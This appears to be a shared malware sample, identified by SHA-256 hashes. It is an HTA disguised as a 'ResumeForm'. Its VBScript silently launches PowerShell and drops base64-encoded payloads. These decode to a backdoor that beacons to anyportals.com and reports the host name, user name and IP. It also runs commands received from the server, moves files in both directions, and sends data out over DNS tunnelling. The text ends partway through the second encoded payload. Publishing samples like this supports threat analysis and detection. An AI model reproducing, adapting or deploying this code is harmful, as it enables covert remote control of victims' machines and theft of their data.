## Uploaded by @JohnLaTwc
## Sample hashes: 0a047e6e246c17f9e3ab59d2309f5e9b57bb452637e1cba0317b47dc5b371a9c 2110b70616efce94c5d3cd0c5a809f551f716fe6ff7be3556b08f7ad00f2b597

######## 2110b70616efce94c5d3cd0c5a809f551f716fe6ff7be3556b08f7ad00f2b597:
<html>
<head>
<HTA:APPLICATION ID="ResumeForm"  BORDER="thin" BORDERSTYLE="complex" maximizeButton="yes" minimizeButton="yes" />
<script type="text/vbscript">
Sub test()   
Set WshShell = CreateObject("Wscript.Shell")
WshShell.Run "powershell  -windowstyle hidden -nologo -ExecutionPolicy Bypass mkdir C:\ProgramData\Windows\Microsoft\java", 0, true
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\ProgramData\Windows\Microsoft\java\hUpdateCheckers.base", True)
    a.WriteLine("aWYgKChHZXQtV21pT2JqZWN0IFdpbjMyX1Byb2Nlc3MgLUZpbHRlciAoIkNvbW1hbmRMaW5lIExJS0UgJyUiKyRNeUludm9jYXRpb24uTXlDb21tYW5kLk5hbWUuVHJpbSgpKyIlJyIpKS5sZW5ndGggLWx0IDEwKSB7IA0KICR7Z2xvYmFsOiR3Y30gPSBuZXctb2JqZWN0IHN5c3RlbS5uZXQuV2ViQ2xpZW50IA0KICR7Z2xvYmFsOiR3Y30ucHJveHkgPSBbU3lzdGVtLk5ldC5XZWJQcm94eV06OkdldERlZmF1bHRQcm94eSgpIA0KICRzcnZyID0gImh0dHA6Ly8iICsgW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3Nlcygid3d3LmFueXBvcnRhbHMuY29tIikgKyIvdXBkYXRlX3dhcHAyLmFzcHgiIA0KICRpcCA9IEdldC1XbWlPYmplY3QgLXF1ZXJ5ICJzZWxlY3QgKiBmcm9tIFdpbjMyX05ldHdvcmtBZGFwdGVyQ29uZmlndXJhdGlvbiB3aGVyZSBJUEVuYWJsZWQgPSAkdHJ1ZSIgfCAleyRfLklQYWRkcmVzc30gDQogJHtnbG9iYWw6JGFpZH0gPSBnZXQtd21pb2JqZWN0IFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdCAgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBVVUlEIHwgJXskXy5yZXBsYWNlKCctJywnJyl9IHwgJXskXyArICIxMjQ1MjQxMzY1MjEifSB8ICV7JF8uc3Vic3RyaW5nKDAsMTIpfSANCiAke2dsb2JhbDokclBhdGh9ID0gJGVudjpQcm9ncmFtRGF0YSArICJcV2luZG93c1xNaWNyb3NvZnRcSmF2YVwiICsgJHtnbG9iYWw6JGFpZH0gDQogZnVuY3Rpb24gc25kcigkZm5hbWUsICRjbnQpeyANCiAJJGFkciA9IGFkckN0ICIkZm5hbWUiICIyIiANCiAJd3JpdGUtaG9zdCAkYWRyIA0KIAl3cml0ZS1ob3N0ICRjbnQgDQogCSR7Z2xvYmFsOiR3Y30uVXBsb2FkU3RyaW5nKCRhZHIsIFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0Qnl0ZXMoJGNudCkpKSANCiB9IA0KIGZ1bmN0aW9uIGFkckN0KCRyaWRJbiwgJGFjKXsgDQogCSRjciA9IEAoKSANCiAJJGRhciA9IEAoKSANCiAJJGRhciA9IC1qb2luIChHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMTUpIA0KIAkkY3IgPSBHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMCAuLiA5KSAtQ291bnQgMiANCiAJJGRhciA9ICRkYXIuSW5zZXJ0KCRjclswXSwgJHJpZEluLlRyaW0oKSkuSW5zZXJ0KCgkY3JbMV0pLCAke2dsb2JhbDokYWlkfSkgDQogCSRhZHIgPSAiJCgkc3J2cik/dmVyc2lvbj0kKCRkYXIpNSQoJGFjKTckKCRjclswXSkkKCRjclsxXSkiIA0KIAlyZXR1cm4gJGFkciANCiB9IA0KIGlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JHJQYXRofSkpIA0KIHsgDQogCU5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJHtnbG9iYWw6JHJQYXRofTsgDQogCXNuZHIgJzEyMTIxMjEyMTIxJyAiJCgkZW52OkNPTVBVVEVSTkFNRSkvJCgkZW52OlVTRVJOQU1FKTw+JCgkaXApIjsgDQogfSANCiAkYWRyID0gYWRyQ3QgIjI0MzUxMjQzNTEwIiAiMCIgDQogJHJpZCA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikgDQogaWYgKCRyaWQpeyANCiAJaWYgKCRyaWQubGVuZ3RoIC1lcSAxMSl7IA0KIAkJJGFkciA9IGFkckN0ICIkcmlkIiAiMSIgDQogCQkkciA9ICR7Z2xvYmFsOiR3Y30uRG93bmxvYWRTdHJpbmcoJGFkcikgDQogCQkkcmNudCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkRlZmF1bHQuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHIpKSANCiAJCSRhZHIgPSBhZHJDdCAiJHJpZCIgIjMiIA0KIAkJJHtnbG9iYWw6JHdjfS5Eb3dubG9hZFN0cmluZygkYWRyKSANCiAJCWlmICgkcmlkLkVuZHNXaXRoKCIwIikpeyANCiAJCQkkcmNudCA9ICRyY250IHwgPyB7ICRfLnRyaW0oKSAtbmUgIiIgfSANCiAJCQkkcmVzICs9ICRyY250LlNwbGl0KCImIikgfCBmb3JlYWNoLW9iamVjdCB7ICRfIHwgaWV4IHwgT3V0LVN0cmluZyB9IA0KIAkJCXNuZHIgJHJpZCAkcmVzIA0KIAkJfSANCiAJCWVsc2VpZiAoJHJpZC5FbmRzV2l0aCgiMSIpKXsgDQogCQkJJGFkciA9ICRyY250LlRyaW0oKSANCiAJCQlpZiAoVGVzdC1QYXRoIC1QYXRoICRhZHIpIA0KIAkJCXsgDQogCQkJCSRhZHJTID0gYWRyQ3QgIiRyaWQiICI0IiANCiAJCQkJJHtnbG9iYWw6JHdjfS5VcGxvYWRGaWxlKCRhZHJTLCAkYWRyKSANCiAJCQl9IA0KIAkJCWVsc2UgDQogCQkJeyANCiAJCQkJc25kciAkcmlkICI0MDQiIA0KIAkJCX0gDQogCQl9IA0KIAkJZWxzZWlmICgkcmlkLkVuZHNXaXRoKCIyIikpeyANCiAJCQlpZigtbm90KFRlc3QtUGF0aCAiJHtnbG9iYWw6JHJQYXRofVxmaWxlc1wiKSkge21kICIke2dsb2JhbDokclBhdGh9XGZpbGVzXCI7fSANCiAJCQkkc2F2QWRyID0gIiR7Z2xvYmFsOiRyUGF0aH1cZmlsZXNcIiskcmNudC50cmltKCk7IA0KIAkJCSRhZHJTID0gYWRyQ3QgIiRyaWQiICI1IiANCiAJCQkke2dsb2JhbDokd2N9LkRvd25sb2FkRmlsZSgkYWRyUywgJHNhdkFkcikgDQogCQkJc25kciAkcmlkICIyMDA8PiRzYXZBZHIiIA0KIAkJfSANCiAJfSANCiB9IA0KIH0=")
    a.Close
Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("C:\ProgramData\Windows\Microsoft\java\dUpdateCheckers.base", True)
    a.WriteLine("JHtnbG9iYWw6JGFkZHJlc3N9ID0gImFueXBvcnRhbHMuY29tIjsgDQogJHtnbG9iYWw6JGFpZHNzc30gPSBnZXQtd21pb2JqZWN0IFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdCAgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBVVUlEIHwgJXskXy5yZXBsYWNlKCctJywnJyl9IHwgJXskXyArICIxMjQ1MjQxMzY1MjEifSB8ICV7JF8uc3Vic3RyaW5nKDAsMTIpfSANCiAke2dsb2JhbDokbXlQYXRoc3NzfSA9ICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGg7IA0KICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAwOyANCiAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50X2xpbWl0c3NzfSA9IDI7IA0KIGZ1bmN0aW9uIEFkckdlbiANCiB7IA0KIAlwYXJhbSAoJHBhcnRfbm9zc3MsICRhY3Rpb25zc3MsICRkYXRhc3NzLCAkZmlsZV9uYW1lc3NzLCAkc2VuZGVyX29yX3JlY2VpdmVyc3NzKSANCiAJJGV4dHJhX3JhbmRzc3MgPSAtam9pbiAoKDQ4IC4uIDU3KSsoNjUgLi4gNzApIHwgR2V0LVJhbmRvbSAgLUNvdW50ICgleyBHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMSAuLiA3KSB9KSB8ICV7IFtjaGFyXSRfIH0pOyANCiAJJGN0cmxfcmFuZG9tX3BsYWNlc3NzID0gR2V0LVJhbmRvbSAtSW5wdXRPYmplY3QgKDAgLi4gOSkgLUNvdW50IDI7IA0KIAkkY29udHJvbF9kYXRhX2FuZF9yYW5kc3NzID0gJHtnbG9iYWw6JGFpZHNzc30uSW5zZXJ0KCgkY3RybF9yYW5kb21fcGxhY2Vzc3NbMV0pLCAkYWN0aW9uc3NzKS5JbnNlcnQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzBdLCAkcGFydF9ub3Nzcyk7IA0KIAlpZiAoJHNlbmRlcl9vcl9yZWNlaXZlcnNzcyAtZXEgInMiKSANCiAJeyANCiAJCXJldHVybiAiJCgkY29udHJvbF9kYXRhX2FuZF9yYW5kc3NzKSQoJGV4dHJhX3JhbmRzc3MpQSQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzBdKSQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzFdKTcuJGRhdGFzc3MuJGZpbGVfbmFtZXNzcy4ke2dsb2JhbDokYWRkcmVzc30iOyANCiAJfSANCiAJZWxzZSANCiAJeyANCiAJCXJldHVybiAiJCgkY29udHJvbF9kYXRhX2FuZF9yYW5kc3NzKSQoJGV4dHJhX3JhbmRzc3MpQSQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzBdKSQoJGN0cmxfcmFuZG9tX3BsYWNlc3NzWzFdKTcuJCgke2dsb2JhbDokYWRkcmVzc30pIjsgDQogCX0gDQogfSANCiBmdW5jdGlvbiByZWNlaXZlIA0KIHsgDQogCSRzYXZlaW5nX21vb2Rzc3MgPSAkZmFsc2U7IA0KIAkkY291bnRlcnNzcyA9IDA7IA0KIAkkc2F2ZV9wYXRoID0gJHtnbG9iYWw6JHJlY2VpdmVfYm94fSArICJcIjsgDQogCSRmZXRjaGVkX2J5dGVzc3NzID0gQCgpOyANCiAJJHJlcV9ubyA9ICIwMDAiOyANCiAJJGFjdGlvbiA9ICIwIjsgDQogCSR7Z2xvYmFsOiRydW59ID0gJHRydWU7IA0KIAkke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gMDsgDQogCVdoaWxlICgke2dsb2JhbDokcnVufSkgDQogCXsgDQogCQlpZiAoJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSAtZ3QgJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudF9saW1pdHNzc30pIHsgYnJlYWsgfSANCiAJCVN0YXJ0LVNsZWVwIC1tIDUwOyANCiAJCWlmICgkY291bnRlcnNzcyAtbHQgMTApIHsgJHJlcV9ubyA9ICIwMCQoJGNvdW50ZXJzc3MpIjsgfSANCiAJCWVsc2VpZiAoJGNvdW50ZXJzc3MgLWx0IDEwMCkgeyAkcmVxX25vID0gIjAkKCRjb3VudGVyc3NzKSI7IH0gDQogCQllbHNlIHsgJHJlcV9ubyA9ICIkKCRjb3VudGVyc3NzKSI7IH0gDQogCQkkbGFzdEFkZHJlc3MgPSBBZHJHZW4gJHJlcV9ubyAkYWN0aW9uICIiICIiICJyIiANCiAJCXRyeSANCiAJCXsgDQogCQkJV3JpdGUtSG9zdCAkbGFzdEFkZHJlc3M7IA0KIAkJCSRyZXN1bHRUbXAgPSBbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0QWRkcmVzc2VzKCRsYXN0QWRkcmVzcyk7IA0KIAkJCVdyaXRlLUhvc3QgJHJlc3VsdFRtcDsgDQogCQl9IA0KIAkJY2F0Y2ggW0V4Y2VwdGlvbl0gDQogCQl7IA0KIAkJCWVjaG8gJF8uRXhjZXB0aW9uLkdldFR5cGUoKS5GdWxsTmFtZSwgJF8uRXhjZXB0aW9uLk1lc3NhZ2U7IFdyaXRlLUhvc3QgImV4Y2VwdG9uIG9jY3VyZWQhIjsgJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSA9ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gKyAxOyBjb250aW51ZTsgDQogCQl9IA0KIAkJaWYgKCRyZXN1bHRUbXAgLWVxICRudWxsKSANCiAJCXsgDQogCQkJJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSA9ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gKyAxOyANCiAJCQljb250aW51ZTsgDQogCQl9IA0KIAkJJHJlc3VsdCA9ICRyZXN1bHRUbXBbMF0uSVBBZGRyZXNzVG9TdHJpbmc7IA0KIAkJJHJlc3VsdF9zcGlsaXRlZHNzcyA9ICRyZXN1bHQuU3BsaXQoJy4nKTsgDQogCQlXcml0ZS1Ib3N0ICIkKCRjb3VudGVyc3NzKTokKCRyZXN1bHRfc3BpbGl0ZWRzc3NbM10pYHRzYXZlaW5nX21vZGU6ICQoJHNhdmVpbmdfbW9vZHNzcylgdCAgICQoJHJlc3VsdF9zcGlsaXRlZHNzc1swXSkgJCgkcmVzdWx0X3NwaWxpdGVkc3NzWzFdKSAkKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMl0pIiANCiAJCWlmICgoJHJlc3VsdF9zcGlsaXRlZHNzc1swXSAtZXEgMSkgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1sxXSAtZXEgMikgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1syXSAtZXEgMykpIA0KIAkJeyANCiAJCQkkc2F2ZWluZ19tb29kc3NzID0gJGZhbHNlOyANCiAJCQkkYWN0aW9uID0gIjAiOyANCiAJCQkkbGVuID0gJGZldGNoZWRfYnl0ZXNzc3MuTGVuZ3RoIA0KIAkJCWlmICgkZmV0Y2hlZF9ieXRlc3Nzc1skbGVuLTFdIC1lcSAwIC1hbmQgJGZldGNoZWRfYnl0ZXNzc3NbJGxlbi0yXSAtZXEgMCkgDQogCQkJeyANCiAJCQkJJGZldGNoVG1wID0gJGZldGNoZWRfYnl0ZXNzc3NbMCAuLiAoJGxlbiAtIDMpXTsgDQogCQkJfSANCiAJCQllbHNlaWYgKCRmZXRjaGVkX2J5dGVzc3NzWyRsZW4gLSAxXSAtZXEgMCkgDQogCQkJeyANCiAJCQkJJGZldGNoVG1wID0gJGZldGNoZWRfYnl0ZXNzc3NbMCAuLiAoJGxlbiAtIDIpXTsgDQogCQkJfSANCiAJCQllbHNlIA0KIAkJCXsgDQogCQkJCSRmZXRjaFRtcCA9ICRmZXRjaGVkX2J5dGVzc3NzOyANCiAJCQl9IA0KIAkJCVtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJHNhdmVfcGF0aCwgJGZldGNoVG1wKTsgDQogCQkJJGZldGNoZWRfYnl0ZXNzc3MgPSBAKCk7IA0KIAkJCSRmZXRjaFRtcCA9IEAoKTsgDQogCQkJJGNvdW50ZXJzc3MgPSAwOyANCiAJCQkke2dsb2JhbDokcnVufSA9ICRmYWxzZTsgDQogCQl9IA0KIAkJaWYgKCRzYXZlaW5nX21vb2Rzc3MpIA0KIAkJeyANCiAJCQlpZiAoJGNvdW50ZXJzc3MgLWd0IDI1MCkgeyAkY291bnRlcnNzcyA9IDA7IH0gDQogCQkJaWYgKCRjb3VudGVyc3NzIC1lcSAkcmVzdWx0X3NwaWxpdGVkc3NzWzNdKSANCiAJCQl7IA0KIAkJCQkkZmV0Y2hlZF9ieXRlc3NzcyArPSAkcmVzdWx0X3NwaWxpdGVkc3NzWzBdOyANCiAJCQkJJGZldGNoZWRfYnl0ZXNzc3MgKz0gJHJlc3VsdF9zcGlsaXRlZHNzc1sxXTsgDQogCQkJCSRmZXRjaGVkX2J5dGVzc3NzICs9ICRyZXN1bHRfc3BpbGl0ZWRzc3NbMl07IA0KIAkJCQkkY291bnRlcnNzcyA9ICRjb3VudGVyc3NzICsgMzsgDQogCQkJfSANCiAJCX0gDQogCQlpZiAoKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMF0gLWVxIDI0KSAtYW5kICgkcmVzdWx0X3NwaWxpdGVkc3NzWzFdIC1lcSAxMjUpKSANCiAJCXsgDQogCQkJJHNhdmVfcGF0aCArPSAkcmVzdWx0X3NwaWxpdGVkc3NzWzJdICsgIiIgKyAkcmVzdWx0X3NwaWxpdGVkc3NzWzNdOyANCiAJCQkkc2F2ZWluZ19tb29kc3NzID0gJHRydWU7IA0KIAkJCSRhY3Rpb24gPSAiMSI7IA0KIAkJCSRjb3VudGVyc3NzID0gMDsgDQogCQl9IA0KIAkJaWYgKCgkcmVzdWx0X3NwaWxpdGVkc3NzWzBdIC1lcSAxMSkgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1sxXSAtZXEgMjQpIC1hbmQgKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMl0gLWVxIDIzNykgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1szXSAtZXEgMTEwKSkgIyBraWxsIHRoaXMgcHJvY2VzcyANCiAJCXsgDQogCQkJJHtnbG9iYWw6JHJ1bn0gPSAkZmFsc2U7IA0KIAkJCSR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ICsgMTsgDQogCQl9IA0KIAl9IA0KIAlTdGFydC1TbGVlcCAtcyAxOyANCiB9IA0KIGZ1bmN0aW9uIHNlbmQgDQogeyANCiAJJGNvdW50ZXJzc3MgPSAwOyANCiAJJGZpbGVzX2xpc3QgPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGggJHtnbG9iYWw6JHNlbmRfYm94fSB8IFdoZXJlLU9iamVjdCB7ICEkXy5QU0lzQ29udGFpbmVyIH0pOyANCiAJaWYgKCRmaWxlc19saXN0IC1uZSAkbnVsbCkgDQogCXsgDQogCQkkdG1wQWRkcmVzcyA9ICR7Z2xvYmFsOiRzZW5kX2JveH0gKyAiXCIgKyAkZmlsZXNfbGlzdFswXTsgDQogCQkkc2VuZGluZ0J5dGVzID0gc2xhYmVyICR0bXBBZGRyZXNzOyANCiAJCWlmIChbaW50XSRzZW5kaW5nQnl0ZXMuTGVuZ3RoIC1sZSAwKSANCiAJCXsgDQogCQkJUmVtb3ZlLUl0ZW0gLVBhdGggJHRtcEFkZHJlc3M7IA0KIAkJCXJldHVybjsgDQogCQl9IA0KIAkJJGNodW5rX3NpemUgPSA2MDsgDQogCQkkc2VuZGluZ0ZpbGVOYW1lc3NzID0gIioiICogNTQ7IA0KIAkJJHNlbmRpbmdGaWxlTmFtZXNzcyA9IFNwbGl0LVBhdGggJHRtcEFkZHJlc3MgLUxlYWYgfCAlIHsgJHNlbmRpbmdGaWxlTmFtZXNzcy5JbnNlcnQoMCwgJF8pIH0gfCAlIHsgJF8uSW5zZXJ0KDYsICRzZW5kaW5nQnl0ZXMuTGVuZ3RoKSB9IHwgJXskX1swLi4yNl0gLWpvaW4gIiJ9OyANCiAJCSRzZW5kaW5nRmlsZU5hbWVzc3MgPSAtam9pbiAoJHNlbmRpbmdGaWxlTmFtZXNzcyB8ICUgeyByZXNvbHZlciAkXyB9KSANCiAJCSRmaWxlQmVnaW5uaW5nID0gImJXVjBZVCIgKyAkc2VuZGluZ0ZpbGVOYW1lc3NzOyANCiAJCSRzZW5kaW5nQnl0ZXMgPSAkZmlsZUJlZ2lubmluZyArICRzZW5kaW5nQnl0ZXM7IA0KIAkJJGZpbGVDaHVua0NvdW50cyA9IFtpbnRdJHNlbmRpbmdCeXRlcy5MZW5ndGggLyBbaW50XSRjaHVua19zaXplOyANCiAJCSRhY2tfbm8gPSAiMDAwIjsgDQogCQkkYWN0aW9uID0gIjIiOyANCiAJCSRidWxrID0gMDsgDQogCQkke2dsb2JhbDokcnVufSA9ICR0cnVlOyANCiAJCSR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAwOyANCiAJCVdoaWxlICgke2dsb2JhbDokcnVufSkgDQogCQl7IA0KIAkJCWlmICgke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9IC1ndCAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50X2xpbWl0c3NzfSkgeyBicmVhazsgfSANCiAJCQlTdGFydC1TbGVlcCAtbSA1MDsgDQogCQkJaWYgKCRjb3VudGVyc3NzIC1lcSAyNTApIHsgJGNvdW50ZXJzc3MgPSAwOyAkYnVsayArPSAyNTA7IH0gDQogCQkJaWYgKCRjb3VudGVyc3NzIC1sdCAxMCkgeyAkYWNrX25vID0gIjAwJCgkY291bnRlcnNzcykiOyB9IA0KIAkJCWVsc2VpZiAoJGNvdW50ZXJzc3MgLWx0IDEwMCkgeyAkYWNrX25vID0gIjAkKCRjb3VudGVyc3NzKSI7IH0gDQogCQkJZWxzZSB7ICRhY2tfbm8gPSAiJCgkY291bnRlcnNzcykiOyB9IA0KIAkJCSANCiAJCQlpZiAoJHNlbmRpbmdCeXRlcy5MZW5ndGggLWd0ICRjaHVua19zaXplKSANCiAJCQl7IA0KIAkJCQlpZiAoKCRzZW5kaW5nQnl0ZXMuTGVuZ3RoIC0gJGNodW5rX3NpemUgKiAoJGNvdW50ZXJzc3MgKyAkYnVsaykpIC1nZSAkY2h1bmtfc2l6ZSkgDQogCQkJCXsgDQogCQkJCQkkY3VycmVudENodW5rID0gJHNlbmRpbmdCeXRlcy5TdWJzdHJpbmcoJGNodW5rX3NpemUgKiAoJGNvdW50ZXJzc3MgKyAkYnVsayksICRjaHVua19zaXplKTsgDQogCQkJCX0gDQogCQkJCWVsc2VpZiAoKCRzZW5kaW5nQnl0ZXMuTGVuZ3RoIC0gJGNodW5rX3NpemUgKiAoJGNvdW50ZXJzc3MgKyAkYnVsaykpIC1ndCAwKSANCiAJCQkJeyANCiAJCQkJCSRjdXJyZW50Q2h1bmsgPSAkc2VuZGluZ0J5dGVzLlN1YnN0cmluZygkY2h1bmtfc2l6ZSAqICgkY291bnRlcnNzcyArICRidWxrKSwgKCRzZW5kaW5nQnl0ZXMuTGVuZ3RoIC0gJGNodW5rX3NpemUgKiAoJGNvdW50ZXJzc3MgKyAkYnVsaykpKTsgDQogCQkJCX0gDQogCQkJCWVsc2UgDQogCQkJCXsgDQogCQkJCQkkY3VycmVudENodW5rID0gImJXVjBZVFpXNWsiOyANCiAJCQkJCSR7Z2xvYmFsOiRydW59ID0gJGZhbHNlOyANCiAJCQkJCVJlbW92ZS1JdGVtIC1wYXRoICR0bXBBZGRyZXNzIC1Gb3JjZTsgDQogCQkJCX0gDQogCQkJfSANCiAJCQllbHNlIA0KIAkJCXsgDQogCQkJCSRjdXJyZW50Q2h1bmsgPSAkc2VuZGluZ0J5dGVzOyANCiAJCQl9IA0KIAkJCSRmaWxlTmFtZVNlbmRpbmdUbXBzc3MgPSAoU3BsaXQtUGF0aCAkdG1wQWRkcmVzcyAtTGVhZikgKyAiKiIgfCAlIHsgcmVzb2x2ZXIgJF8gfTsgDQogCQkJJGxhc3RBZGRyZXNzID0gQWRyR2VuICRhY2tfbm8gJGFjdGlvbiAkY3VycmVudENodW5rICRmaWxlTmFtZVNlbmRpbmdUbXBzc3MgInMiIA0KIAkJCVdyaXRlLUhvc3QgIiQoJGN1cnJlbnRDaHVuaylgdCQoJGxhc3RBZGRyZXNzKSIgDQogCQkJdHJ5IA0KIAkJCXsgDQogCQkJCSRyZXN1bHRUbXAgPSBbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0QWRkcmVzc2VzKCRsYXN0QWRkcmVzcyk7IA0KIAkJCX0gDQogCQkJY2F0Y2ggeyBXcml0ZS1Ib3N0ICJleGNlcHRvbiBvY2N1cmVkISI7ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ICsgMTsgY29udGludWU7IH0gDQogCQkJIA0KIAkJCWlmICgkcmVzdWx0VG1wIC1lcSAkbnVsbCkgeyAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSArIDE7Y29udGludWUgfSANCiAJCQkkcmVzdWx0ID0gJHJlc3VsdFRtcFswXS5JUEFkZHJlc3NUb1N0cmluZzsgDQogCQkJJHJlc3VsdF9zcGlsaXRlZHNzcyA9ICRyZXN1bHQuU3BsaXQoJy4nKTsgDQogCQkJV3JpdGUtSG9zdCAiJCgkY291bnRlcnNzcyk6JCgkcmVzdWx0X3NwaWxpdGVkc3NzWzNdKWB0c2F2ZWluZ19tb2RlOiAkKCRzYXZlaW5nX21vb2Rzc3MpYHQgICAkKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMF0pICQoJHJlc3VsdF9zcGlsaXRlZHNzc1sxXSkgJCgkcmVzdWx0X3NwaWxpdGVkc3NzWzJdKSIgDQogCQkJIA0KIAkJCWlmICgoJHJlc3VsdF9zcGlsaXRlZHNzc1swXSAtZXEgMSkgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1sxXSAtZXEgMikgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1syXSAtZXEgMykpIA0KIAkJCXsgDQogCQkJCSRjb3VudGVyc3NzID0gW2ludF0kcmVzdWx0X3NwaWxpdGVkc3NzWzNdOyANCiAJCQl9IA0KIAkJCSANCiAJCQlpZiAoKCRyZXN1bHRfc3BpbGl0ZWRzc3NbMF0gLWVxIDExKSAtYW5kICgkcmVzdWx0X3NwaWxpdGVkc3NzWzFdIC1lcSAyNCkgLWFuZCAoJHJlc3VsdF9zcGlsaXRlZHNzc1syXSAtZXEgMjM3KSAtYW5kICgkcmVzdWx0X3NwaWxpdGVkc3NzWzNdIC1lcSAxMTApKSAjIGtpbGwgdGhpcyBwcm9jZXNzIA0KIAkJCXsgDQogCQkJCSRidWxrID0gMCANCiAJCQkJJHtnbG9iYWw6JHJ1bn0gPSAkZmFsc2U7IA0KIAkJCQkke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSArIDM7IA0KIAkJCQlkZWwgJHRtcEFkZHJlc3M7IA0KIAkJCX0gDQogCQl9IA0KIAl9IA0KIH0gDQogIA0KIGZ1bmN0aW9uIHNsYWJlciANCiB7IA0KIAlQYXJhbSAoJGZpbGVQYXRoKSANCiAJaWYgKChHZXQtSXRlbSAkZmlsZVBhdGgpLmxlbmd0aCAtZ3QgNjAwa2IpIA0KIAl7IA0KIAkJInJlc3VsdCBzaXplIGV4Y2VlZGVkIHRoZSBtYXhpbXVtIHNpemUgYW5kIGl0IGRlbGV0ZWQiIHwgU2V0LUNvbnRlbnQgJGZpbGVQYXRoOyANCiAJfSANCiAJJGZpbGUgPSBHZXQtQ29udGVudCAkZmlsZVBhdGggLUVuY29kaW5nIEJ5dGU7IA0KIAkkZW5jb2RlZCA9IHJlc29sdmVyKCRmaWxlKTsgDQogCXJldHVybiAkZW5jb2RlZDsgDQogfSANCiBmdW5jdGlvbiByZXNvbHZlciAoJGJ5dGVfYXJyYXkpIA0KIHsgDQogCSRjbnQgPSAwOyANCiAJJHAxID0gIiI7IA0KIAkkcDIgPSAiIjsgDQogCWZvciAoJGkgPSAwOyAkaSAtbHQgJGJ5dGVfYXJyYXkuTGVuZ3RoOyAkaSsrKSANCiAJeyANCiAJCWlmICgkY250IC1lcSAzMCkgDQogCQl7IA0KIAkJCSRjbnQgPSAwOyANCiAJCQkkcmVzICs9ICgkcDEgKyAkcDIpOyANCiAJCQkkcDEgPSAiIjsgJHAyID0gIiI7IA0KIAkJfSANCiAJCSR0bXAgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRieXRlX2FycmF5WyRpXSkuUmVwbGFjZSgiLSIsICIiKTsgDQogCQkkcDEgKz0gJHRtcFswXTsgDQogCQkkcDIgKz0gJHRtcFsxXTsgDQogCQkkY250Kys7IA0KIAl9IA0KIAkkcmVzICs9ICgkcDEgKyAkcDIpOyANCiAJcmV0dXJuICRyZXM7IA0KIH0gDQogZnVuY3Rpb24gcHJvY2Vzc29yIA0KIHsgDQogCSRmaWxlc19saXN0ID0gQChHZXQtQ2hpbGRJdGVtIC1QYXRoICR7Z2xvYmFsOiRyZWNlaXZlX2JveH0gfCBXaGVyZS1PYmplY3QgeyAhJF8uUFNJc0NvbnRhaW5lciB9KTsgDQogCWlmICgkZmlsZXNfbGlzdCAtbmUgJG51bGwpIA0KIAl7IA0KIAkJJHRtcEFkZHJlc3MgPSAke2dsb2JhbDokcmVjZWl2ZV9ib3h9ICsgIlwiICsgJGZpbGVzX2xpc3RbMF07IA0KIAkJJG5ld1RtcEFkZHJlc3Mzc3NzID0gJHRtc